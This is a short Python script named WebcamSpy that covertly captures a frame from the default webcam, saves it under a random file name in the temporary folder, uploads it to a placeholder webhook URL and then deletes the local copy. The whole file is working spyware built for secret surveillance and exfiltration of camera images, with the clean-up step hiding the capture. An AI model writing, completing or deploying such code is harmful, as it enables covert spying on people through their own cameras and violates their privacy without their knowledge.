import cv2
import requests
import os
import random
import string

class WebcamSpy:

    def __init__(self):
        self.file_path = self.capture_screenshot()
        self.send_to_webhook(self.file_path)
        os.remove(self.file_path)

    def capture_screenshot(self):
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if not ret:
            cam.release()
            exit()
        cam.release()

        file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5)) + ".png"
        file_path = os.path.join(os.getenv('TEMP'), file_name)
        cv2.imwrite(file_path, frame)

        return file_path

    def send_to_webhook(self, file_path):
        webhook_url = " Your webhook "
        with open(file_path, "rb") as file:
            files = {"image": file}
            response = requests.post(webhook_url, files=files)

if __name__ == "__main__":
    WebcamSpy()
